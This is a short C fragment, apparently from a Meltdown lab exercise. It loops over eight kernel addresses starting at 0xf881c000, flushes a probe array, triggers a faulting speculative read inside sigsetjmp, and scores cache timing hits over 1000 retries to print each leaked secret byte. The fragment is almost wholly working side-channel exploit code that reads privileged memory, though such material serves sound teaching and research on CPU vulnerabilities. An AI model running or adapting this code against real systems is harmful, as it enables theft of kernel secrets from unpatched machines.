for (int k = 0; k < 8; k++)
{

    memset(scores, 0, sizeof(scores));

    flushSideChannel();

    // Retry 1000 times on the same address.

    for (i = 0; i < 1000; i++)
    {

        ret = pread(fd, NULL, 0, 0);

        if (ret < 0)
        {

            perror("pread");

            break;
        }

        // Flush the probing array

        for (j = 0; j < 256; j++)

            _mm_clflush(&array[j * 4096 + DELTA]);

        if (sigsetjmp(jbuf, 1) == 0)
        {
            meltdown_asm(0xf881c000 + k);
        }

        reloadSideChannelImproved();
    }

    // Find the index with the highest score.

    int max = 0;

    for (i = 0; i < 256; i++)
    {

        if (scores[max] < scores[i])
            max = i;
    }

    printf("The secret value is %d %c\n", max, max);

    printf("The number of hits is %d\n", scores[max]);
}